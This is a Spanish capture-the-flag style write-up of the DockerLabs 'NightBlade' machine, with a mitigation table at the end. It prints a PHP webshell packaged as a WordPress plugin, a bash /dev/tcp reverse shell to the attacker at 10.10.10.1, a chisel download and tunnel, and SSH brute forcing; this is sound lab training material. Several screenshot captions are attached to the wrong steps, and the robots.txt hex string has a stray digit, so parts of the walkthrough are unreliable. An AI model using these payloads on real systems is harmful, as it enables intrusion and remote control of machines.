---
layout: post
render_with_liquid: false
title: "DockerLabs Writeup: NightBlade"
date: 2026-04-28
category: writeups
tags: [dockerlabs, linux, medium, wordpress, wpscan, host-header-injection, plugin-upload, rce, pivoting, chisel, proxychains, hydra, cron, suid-bash]
platform: DockerLabs
os: Linux
difficulty: Medium
has_exploits: false
resumen: "Restricted shell web filtra una wordlist oculta vía robots.txt. WPScan + brute force a WordPress, redirección 172.17.0.2 corregida en Burp y RCE por subida de plugin. Pivoting con chisel SOCKS5 para alcanzar la red 20.20.20.0/24, enumeración de usuarios por el buscador de la intranet, Hydra SSH y privesc por cron writable que setea SUID a /bin/bash."
permalink: /writeups/nightblade/
---

| Propiedad  | Valor        |
| :--------- | :----------- |
| Plataforma | DockerLabs   |
| OS         | Linux        |
| Dificultad | Medium       |
| Autor      | Ghostvyle    |

## Sinopsis

**NightBlade** es una máquina de DockerLabs cuyo recorrido encadena un acceso web simulado por terminal, **WordPress vulnerable**, una redirección a IP interna (`172.17.0.2`) que hay que neutralizar desde Burp y un **pivoting con chisel** hacia una segunda red interna donde vive una intranet corporativa.

La intrusión inicial parte de una *restricted shell* en el navegador que filtra el listado de ficheros del DocumentRoot. Un `robots.txt` con una entrada hex codificada en base64 destapa una wordlist privada (`/s3cr3t@/list.txt`). Con esa wordlist y **WPScan** atacamos `/wp/`, identificamos al usuario `krav0` y crackeamos su contraseña: `krav0:voidwalker`. El login redirige a la IP interna del contenedor (`172.17.0.2`); resolvemos la limitación con un **redirect en Burp Suite** y conseguimos sesión en el panel. Subimos un **plugin malicioso** empaquetado en `.zip` con un webshell PHP, lo activamos y obtenemos **RCE como `www-data`**.

Desde la propia shell de `www-data` enumeramos interfaces y descubrimos una segunda NIC en `eth1 20.20.20.2/24`. Subimos **chisel** al contenedor y abrimos un **SOCKS5 reverso** en `127.0.0.1:4444`. Un *host discovery* con bash + proxychains sobre `20.20.20.0/24` localiza `20.20.20.3:80`, una intranet de **NightBlade Corp** cuyo buscador de empleados nos entrega los usuarios `nightblade`, `alice`, `krav0`, `jsmith`. **Hydra SSH** con `2020-200_most_used_passwords.txt` de SecLists nos da `nightblade:dragon`. El último escalón se cierra con un **cron writable** que descubrimos leyendo el `.bash_history` del propio `nightblade`: `/opt/scripts/check.sh` pertenece al grupo `nightblade` con `+w` y se ejecuta cada minuto como `root`; sobrescribimos el script para que aplique `chmod u+s /bin/bash` y, tras esperar la próxima ejecución, `bash -p` nos deja sesión de **root**.

---

## Reconocimiento

### Identificación del rango

Comprobamos que la víctima está activa con un *host discovery* sobre la red del laboratorio:

```bash
sudo nmap -sn 10.10.10.0/24
```

![Host discovery — 10.10.10.2 activo](/writeups/nightblade/assets/01_nmap_host_discovery.png)

`10.10.10.2` responde como única víctima.

### Escaneo de puertos

Lanzamos un escaneo SYN completo sobre los 65535 puertos TCP:

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.2 -oG allPorts
```

| Parámetro         | Descripción                                    |
| ----------------- | ---------------------------------------------- |
| `-p-`             | Escanea los 65535 puertos TCP                  |
| `--open`          | Solo muestra puertos abiertos                  |
| `-sS`             | SYN Scan (half-open)                           |
| `--min-rate 5000` | Mínimo de 5000 paquetes por segundo            |
| `-vvv`            | Verbosidad máxima                              |
| `-n`              | Sin resolución DNS                             |
| `-Pn`             | Asume host activo, sin host discovery          |
| `-oG allPorts`    | Salida grepeable                               |

![Escaneo completo de puertos abiertos](/writeups/nightblade/assets/02_nmap_full_ports.png)

Solo el `80/tcp` está abierto.

### Detección de versiones

```bash
sudo nmap -sCV -p80 10.10.10.2 -oN targeted
```

![nmap -sCV detectando Apache 2.4.58 + robots.txt](/writeups/nightblade/assets/03_nmap_versions.png)

Resultado:

- **80/tcp** — Apache httpd 2.4.58 (Ubuntu)
- **robots.txt** con dos *disallowed entries* (que veremos en breve)
- **/wp/wp-admin/** detectado por NSE
- **Title**: NightBlade Gaming Network

Confirmamos el stack con `whatweb`:

```bash
whatweb 10.10.10.2:80
```

![whatweb confirmando Apache 2.4.58 sobre Ubuntu](/writeups/nightblade/assets/04_whatweb.png)

---

## Reconocimiento web

### La *restricted shell* del navegador

Visitamos `http://10.10.10.2/` y la página presenta una *restricted shell* simulada con HTML/JS:

```text
NIGHTBLADE GAMING NETWORK v3.1.7 — RESTRICTED SHELL
Session logged. Unauthorized access will be prosecuted.
Logged in as guest — limited shell active.
Type help for available commands.
```

![Restricted shell del frontal con Wappalyzer mostrando Apache 2.4.58/Ubuntu](/writeups/nightblade/assets/05_web_homepage.png)

El prompt acepta unos pocos comandos. Probamos `ls` y `whoami`:

```text
guest@nightblade:~$ ls
index.html  robots.txt  blog  media  static  wp  wp-admin  secret
guest@nightblade:~$ whoami
guest
```

![ls revelando el listado del DocumentRoot, incluyendo `secret` y `wp`](/writeups/nightblade/assets/06_restricted_shell_ls.png)

Aparecen rutas interesantes: `wp/`, `wp-admin/` y `secret`. La primera intuición es probar `secret/note.txt`:

![Wordlist privada servida en /s3cr3t@/list.txt](/writeups/nightblade/assets/10_list_txt.png)

No nos deja acceder ni desde la URL (responde con `404 Not Found`) ni desde la propia *restricted shell* del navegador, que tampoco permite leer ficheros. La pista útil estaba en `robots.txt`.

### `robots.txt` y wordlist oculta

```text
http://10.10.10.2/robots.txt
```

![robots.txt — Disallow /wp/wp-admin/ + cadena hex sospechosa](/writeups/nightblade/assets/08_robots_txt.png)

```text
User-agent: *
Disallow: /wp/wp-admin/
Disallow: 4c334d7a5933497a6445417662476c7a6444335306548513d0a
```

La segunda entrada **no es una ruta**: es una cadena hexadecimal que, decodificada, devuelve **base64**. Encadenamos ambas decodificaciones:

```bash
echo '4c334d7a5933497a6445417662476c7a6444335306548513d0a' | xxd -r -p | base64 -d; echo
```

![hex → base64 → /s3cr3t@/list.txt](/writeups/nightblade/assets/09_decode_hash.png)

Resultado: `/s3cr3t@/list.txt`. La descargamos directamente desde nuestra máquina:

```bash
wget http://10.10.10.2/s3cr3t@/list.txt
```

![WordPress en /wp/ con Wappalyzer mostrando WordPress, PHP, Apache, MySQL](/writeups/nightblade/assets/12_wp_homepage.png)

Confirmamos en el navegador que el contenido es una **wordlist de contraseñas**:

![wget descargando list.txt — 200 OK, 418 bytes](/writeups/nightblade/assets/11_wget_list.png)

Esta wordlist será usada para el ataque a WordPress.

---

## Acceso a WordPress — `krav0`

### WordPress en `/wp/`

`/wp/` carga directamente un WordPress recién instalado con la entrada **¡Hola mundo!**. Wappalyzer confirma WordPress + PHP + Apache 2.4.58 + MySQL:

![secret/note.txt → 404 Not Found](/writeups/nightblade/assets/07_secret_note_404.png)

El panel de login está en `/wp/wp-login.php`:

![Formulario wp-login.php por defecto de WordPress](/writeups/nightblade/assets/13_wp_login.png)

### Enumeración con WPScan

Lanzamos un primer barrido para enumerar usuarios y plugins:

```bash
wpscan --url http://10.10.10.2/wp/ -enumerate u,vp,cb,dbe
```

![WPScan reportando WordPress 6.9.4 y vulnerabilidades agregadas](/writeups/nightblade/assets/14_wpscan_users.png)

![WPScan continuando — sin plugins instalados, identifica usuario krav0](/writeups/nightblade/assets/15_wpscan_user_krav0.png)

WPScan identifica un único usuario: **`krav0`**.

### Brute force de la contraseña

Con la wordlist obtenida del paso anterior, atacamos `wp-login` directamente:

```bash
wpscan --url http://10.10.10.2/wp/ --usernames krav0 --passwords list.txt --password-attack wp-login --force --no-banner 2>/dev/null | grep "krav0"
```

![WPScan crackeando krav0:voidwalker](/writeups/nightblade/assets/16_wpscan_password.png)

Resultado: **`krav0 : voidwalker`**.

---

## Explotación inicial — Plugin malicioso

### El problema del redirect a `172.17.0.2`

Al enviar el formulario de login, WordPress redirige a `http://172.17.0.2/wp/wp-admin/`. Esa IP **es la dirección interna del contenedor Docker**, inalcanzable desde nuestra máquina (`10.10.10.1`). Si no neutralizamos esta redirección, perdemos la sesión justo después del login.

La solución es interceptar y reescribir la respuesta con **Burp Suite**. Hay dos formas equivalentes:

- Match-and-Replace sobre los headers `Location:` y el body.
- **Target → Redirector**, que reescribe a nivel TCP cualquier conexión hacia `172.17.0.2` apuntándola a `10.10.10.2`.

Optamos por la segunda:

![Burp Target Redirector — 172.17.0.2 → 10.10.10.2](/writeups/nightblade/assets/17_burp_redirect.png)

Con eso, repetimos el login:

![wp-login.php aceptando krav0 y redirigiendo correctamente al panel](/writeups/nightblade/assets/18_wp_login_krav0.png)

![Dashboard de WordPress como krav0](/writeups/nightblade/assets/19_wp_dashboard.png)

Ya estamos dentro como `krav0`, que dispone de privilegios para gestionar plugins.

### Plugin custom con webshell

Construimos un plugin mínimo de WordPress con un webshell PHP. Solo necesita una cabecera reconocible y el handler de comandos:

```php
<?php
/*
Plugin Name: Backdoor
Description: Plugin de prueba para laboratorio NightBlade.
Version: 1.0
Author: ghostvyle
*/

if (isset($_REQUEST['cmd'])) {
    echo "<pre>";
    system($_REQUEST['cmd']);
    echo "</pre>";
    die();
}
?>
```

![Contenido de backdoor.php en el editor](/writeups/nightblade/assets/20_backdoor_php.png)

WordPress espera el plugin en formato `.zip` con su carpeta contenedora. Lo empaquetamos:

```bash
mkdir -p backdoor
mv backdoor.php backdoor/
7z a backdoor.zip backdoor/
```

![7z empaquetando la carpeta backdoor en backdoor.zip](/writeups/nightblade/assets/21_zip_backdoor.png)

### Subida y activación

Desde **Plugins → Añadir nuevo → Subir plugin** seleccionamos el `.zip`:

![Pantalla de Plugins con botón Subir plugin](/writeups/nightblade/assets/22_wp_add_plugin.png)

El plugin se descomprime e instala correctamente:

![Plugin instalado correctamente — ofrece Activar plugin](/writeups/nightblade/assets/23_plugin_uploaded.png)

Tras activarlo, el archivo queda servido en la ruta estándar de plugins de WordPress:

```text
http://10.10.10.2/wp/wp-content/plugins/backdoor/backdoor.php?cmd=whoami
```

![backdoor.php?cmd=whoami → www-data](/writeups/nightblade/assets/24_backdoor_whoami.png)

**RCE confirmada como `www-data`**.

### Reverse shell

Con un webshell GET, el `&` y `>` necesitan **URL-encoding** para que no se interpreten como separadores. Disparamos la reverse shell desde Burp Repeater:

```text
GET /wp/wp-content/plugins/backdoor/backdoor.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.10.1/7777+0>%261' HTTP/1.1
Host: 10.10.10.2
```

![Burp Repeater enviando la reverse shell URL-encoded](/writeups/nightblade/assets/25_revshell_request.png)

En el listener:

```bash
nc -lvnp 7777
```

![nc recibiendo la conexión desde 10.10.10.2 como www-data](/writeups/nightblade/assets/26_revshell_received.png)

```text
Connection received on 10.10.10.2 41624
www-data@24f8a4a4af58:/var/www/html/wp/wp-content/plugins/backdoor$
```

Una mirada rápida a `/etc/passwd` para confirmar el contexto:

![cat /etc/passwd dentro del contenedor](/writeups/nightblade/assets/27_etc_passwd.png)

---

## Pivoting #1 — `10.10.10.0/24` → `20.20.20.0/24`

### Descubrimiento de la segunda red

Una vez con shell, comprobamos las interfaces:

```bash
ifconfig
```

![ifconfig mostrando eth0 10.10.10.2/24 y eth1 20.20.20.2/24](/writeups/nightblade/assets/28_ifconfig.png)

Hay una **segunda interfaz `eth1` en `20.20.20.2/24`** que solo es alcanzable a través de este contenedor. Antes de pivotar, revisamos la base de datos local por si nos da credenciales adicionales:

```bash
cat /var/www/html/wp/wp-config.php | grep -i 'DB_'
```

![wp-config.php — DB_USER='wp_user', DB_PASSWORD='wppass'](/writeups/nightblade/assets/29_wp_config.png)

```bash
mysql -u wp_user -pwppass -h 127.0.0.1 wordpress
```

![Sesión MariaDB con wp_user/wppass](/writeups/nightblade/assets/30_mysql_login.png)

```sql
select ID, user_login, user_pass, user_email from wp_users;
```

![SELECT — solo aparece krav0 con su hash $wp$2y$10$…](/writeups/nightblade/assets/31_mysql_users.png)

Solo `krav0`, hash `$wp$2y$10$…`. La contraseña ya la teníamos (`voidwalker`), así que no aporta nada nuevo. Pasamos al pivoting.

### Túnel chisel — SOCKS5 reverso

Servimos `chisel` desde nuestra máquina y lo descargamos en el contenedor:

```bash
# Atacante
python3 -m http.server 1234
```

```bash
# Víctima (www-data, dentro del contenedor)
cd /tmp
wget http://10.10.10.1:1234/chisel
chmod +x chisel
```

![wget descargando chisel desde el atacante + http.server sirviendo el binario](/writeups/nightblade/assets/32_chisel_upload.png)

Levantamos el server reverso en el atacante y conectamos el cliente desde la víctima:

```bash
# Atacante
./chisel server --reverse -p 7171

# Víctima
./chisel client 10.10.10.1:7171 R:4444:socks
```

![chisel server con sesión activa + cliente conectado pidiendo R:4444:socks](/writeups/nightblade/assets/33_chisel_tunnel.png)

`R:4444:socks` indica al server que abra un **SOCKS5 inverso en `127.0.0.1:4444`** del atacante. Cualquier tráfico que enviemos a ese puerto saldrá efectivamente desde la víctima.

Configuramos `proxychains`:

```text
# /etc/proxychains.conf — al final
socks5  127.0.0.1 4444
```

![Entrada socks5 127.0.0.1 4444 en proxychains.conf](/writeups/nightblade/assets/34_proxychains_conf.png)

### Descubrimiento de la red interna

Hacemos un *host discovery* sobre `20.20.20.0/24` con un bucle bash + `proxychains`:

```bash
for p in 80 22 3306 8080 443; do for i in $(seq 1 254); do proxychains -q nc -zvw1 20.20.20.$i $p 2>&1 | grep -q succeeded && echo "20.20.20.$i:$p open"; done; done
```

![Host discovery con bash + proxychains — 20.20.20.2:80 y 20.20.20.3:80 abiertos](/writeups/nightblade/assets/35_bash_scan_internal.png)

`20.20.20.2:80` es el propio contenedor (su otra cara) y **`20.20.20.3:80`** es un nuevo host. Profundizamos con nmap por proxychains:

```bash
sudo proxychains -q nmap -sT -Pn -n --open --top-ports 1000 20.20.20.3 2>/dev/null
```

![nmap por proxychains — 22 y 80 abiertos en 20.20.20.3](/writeups/nightblade/assets/36_proxychains_nmap.png)

`22/tcp` y `80/tcp` abiertos en `20.20.20.3`.

> Con `proxychains` hay que usar **`-sT`** (TCP connect). El SYN scan (`-sS`) requiere raw sockets y no se transporta por SOCKS.

---

## Acceso a la intranet — `20.20.20.3`

### Acceso por navegador y Burp

Configuramos **FoxyProxy** apuntando al SOCKS5 del túnel:

![FoxyProxy con perfil "Pivoting" — SOCKS5 127.0.0.1:4444](/writeups/nightblade/assets/37_foxyproxy.png)

Visitamos `http://20.20.20.3/` y obtenemos la **Apache2 Default Page** de Ubuntu:

![Apache2 Default Page en 20.20.20.3](/writeups/nightblade/assets/38_apache_default.png)

Configuramos también **Burp Suite** para que use el SOCKS5 y poder interceptar tráfico hacia la red interna:

![GET /index.php?search=nightblade — respuesta de la intranet con jsmith en el resultado](/writeups/nightblade/assets/42_intranet_search.png)

### Fuzzing de rutas

Antes de seguir explorando manualmente lanzamos `gobuster` por proxychains para mapear rutas:

```bash
proxychains -q gobuster dir -u http://20.20.20.3 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt --proxy socks5://127.0.0.1:4444 -t5 -b404
```

![gobuster identificando index.html, index.php y directorios estáticos](/writeups/nightblade/assets/41_gobuster.png)

Entre los hits aparece **`index.php`** además de la página por defecto. Lo visitamos y aparece una intranet corporativa:

![Burp — User settings → Use SOCKS proxy 127.0.0.1:4444](/writeups/nightblade/assets/40_burp_socks.png)

Cuatro nombres aparecen ya en los tickets visibles.

### Buscador de empleados

El recurso interesante es el propio **buscador de empleados** del `index.php`. Probamos un nombre conocido (`nightblade`) y observamos la respuesta en Burp:

El buscador está reflejando la consulta y devuelve coincidencias. Probamos también un *probe* clásico de **SSTI** con `<%= 7*7 %>` (codificado):

```text
GET /index.php?search=%3C%25%3D+7*7+%25%3E HTTP/1.1
```

![Burp — el value del input vuelve "<%= 7*7 %>" sin evaluar; "No results found"](/writeups/nightblade/assets/43_ssti_test.png)

La salida devuelve la cadena tal cual (`No results found for "<%= 7*7 %>"`), lo que descarta SSTI. El buscador es un simple `LIKE` sobre la lista de empleados. Iteramos con nombres comunes y vamos coleccionando los que devuelven coincidencias:

```text
nightblade
alice
krav0
jsmith
```

![users.txt con los cuatro usuarios extraídos del buscador](/writeups/nightblade/assets/44_users_txt.png)

### Hydra SSH contra `20.20.20.3`

Con `users.txt` y la wordlist `2020-200_most_used_passwords.txt` de SecLists, atacamos SSH a través de proxychains:

```bash
proxychains hydra -L content/users.txt -P /usr/share/seclists/Passwords/Common-Credentials/2020-200_most_used_passwords.txt 20.20.20.3 -t 15 ssh 2>/dev/null
```

![Hydra encontrando nightblade:dragon en 20.20.20.3](/writeups/nightblade/assets/45_hydra_ssh.png)

```text
[22][ssh] host: 20.20.20.3   login: nightblade   password: dragon
```

Resultado: **`nightblade : dragon`**. Conectamos:

```bash
proxychains ssh nightblade@20.20.20.3
```

![SSH como nightblade en c8507df1e926 (20.20.20.3)](/writeups/nightblade/assets/46_ssh_nightblade.png)

Estamos como `nightblade` en el segundo contenedor.

---

## Escalada de privilegios — `nightblade` → `root`

### Identificación del cron writable

La pista para la escalada aparece directamente al inspeccionar el `.bash_history` del usuario:

```bash
cat ~/.bash_history
```

![.bash_history mostrando ediciones repetidas a /opt/scripts/check.sh](/writeups/nightblade/assets/47_check_sh_history.png)

El historial deja claras las referencias a `/opt/scripts/check.sh`: ediciones, lecturas y pruebas de payload. Con esa pista, inspeccionamos el script y el cron asociado:

```bash
cat /opt/scripts/check.sh
```

Los puntos clave:

- `check.sh` pertenece a **`root:nightblade`** con **permisos de escritura para el grupo**.
- Nuestro usuario `nightblade` está en ese grupo.
- El cron lo ejecuta **cada minuto como `root`**.

### Explotación

Sobrescribimos el script para que aplique el bit **SUID** a `/bin/bash`:

```bash
echo 'chmod u+s /bin/bash' >> /opt/scripts/check.sh
```

Esperamos al siguiente minuto y verificamos los permisos:

```bash
ls -la /bin/bash
# -rwsr-xr-x 1 root root 1396520 Mar 14  2024 /bin/bash

bash -p
```

![check.sh modificado + bash -p devolviendo shell como root](/writeups/nightblade/assets/48_check_sh_root.png)

```text
bash-5.1# whoami
root
```

Máquina conquistada de extremo a extremo.

> `bash -p` preserva el `EUID` del binario invocado. Sin `-p`, bash detecta el SUID y reduce privilegios a los del usuario real. El bit SUID sobre `/bin/bash` es un *backdoor* clásico precisamente por lo trivial de explotarlo con esta flag.

---


## Detección y mitigación

| Vector                                       | Mitigación / Detección                                                                                                                                                                |
| -------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Wordlist filtrada por `robots.txt`**       | Nunca usar `robots.txt` como mecanismo de ocultación. Cualquier ruta sensible debe estar fuera del DocumentRoot o protegida por autenticación. Auditar valores no estándar en el fichero. |
| **WordPress con un único usuario y wp-login abierto** | Forzar 2FA, limitar tasa de intentos (`Limit Login Attempts Reloaded`, `fail2ban`), políticas de contraseña fuerte, deshabilitar `xmlrpc.php`.                                       |
| **Redirect a IP interna del contenedor**     | Configurar `WP_HOME` y `WP_SITEURL` con la URL pública. Forzar `siteurl` en la base de datos al hostname externo. Inspeccionar `Location` headers tras el login.                       |
| **Plugin upload con permisos de `editor`/`administrator`** | Aplicar `DISALLOW_FILE_EDIT` y `DISALLOW_FILE_MODS` en `wp-config.php`. Restringir el grupo de usuarios capaz de subir plugins. WAF que detecte ZIPs con PHP en `/wp-content/plugins/`. |
| **SSH expuesto en red interna sin rate-limit** | `fail2ban`, autenticación por clave pública, deshabilitar `PasswordAuthentication`. Auditar `/var/log/auth.log` por picos de fallos.                                                  |
| **Cron writable por usuario no privilegiado** | Auditar `/etc/cron.d`, `/etc/cron.*` y scripts referenciados. Ningún script ejecutado como `root` debería ser writable por grupos distintos a `root`. `auditd` con regla sobre escrituras en `/opt/scripts/`. |
| **SUID en `/bin/bash`**                      | Auditoría periódica con `find / -perm -4000 -type f 2>/dev/null`. Alertas SIEM ante cambios de permisos sobre binarios críticos del sistema.                                          |

---

> **Disclaimer**: Este contenido es exclusivamente para investigación y formación en ciberseguridad. Solo debe aplicarse en entornos autorizados y controlados como los laboratorios de DockerLabs, HackTheBox o entornos propios. El uso de estas técnicas contra infraestructura sin permiso explícito es ilegal.
